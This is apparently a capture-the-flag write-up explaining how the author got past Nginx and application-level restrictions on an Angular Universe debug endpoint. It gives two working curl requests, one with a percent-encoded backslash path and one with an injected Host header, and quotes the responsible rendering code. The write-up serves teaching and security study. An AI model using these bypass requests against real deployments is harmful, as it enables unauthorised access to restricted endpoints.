Angular of the Universe
The challenge was about bypassing the Angular application that was set up behind Nginx reverse proxy. The challenge contained two flags:
- first was hidden in the angular endpoint /debug/answer restricted by the Nginx and the application
- second hidden in the express endpoint /api/true-answer which yielded results only for 127.0.0.1 IP addresses.
Flag#1 /debug/answer (139 points, 39 solves)
The goal was to access /debug/answer endpoint which was restricted in two ways:
* the nginx restricted access to /debug* via:
conf
  location /debug {
    # IP address restriction.
    # TODO: add allowed IP addresses here
    allow 127.0.0.1;
    deny all;
  }

* the application was rejecting requests containg a debug word via:
js
    if (process.env.FLAG && req.path.includes('debug')) {
      return res.status(500).send('debug page is disabled in production env')
    }

I managed to score the first blood on this challenge via a simple request to /\%64ebug/answer. 
sh
curl --path-as-is 'http://universe.chal.ctf.westerns.tokyo/\%64ebug/answer'

This works because angular recognizes \ as /, and %-decodes strings. Therefore it matched to debug/answer. 
TWCTF{ky0-wa-dare-n0-donna-yume-ni?kurukuru-mewkledreamy!}
Bonus - insane Path Traveral
When playing with the challenge, I also found a super fancy way of solving the challenge for the second flag. 
sh
curl 'http://universe.chal.ctf.westerns.tokyo' -H 'Host: \debug\answer'

When Angular tries to match up the path, it parses the URL created from PROTOCOL + HOST + PATH. Because we injected \debug\answer as the host, the Angular parses http://\debug\answer\ and retrieves the path as /debug/answer. This is an ultimately odd behavior! 
The code responsible for this odd behavior can be found here.
js
 renderOptions.url =
      renderOptions.url || `${req.protocol}://${(req.get('host') || '')}${req.originalUrl}`;

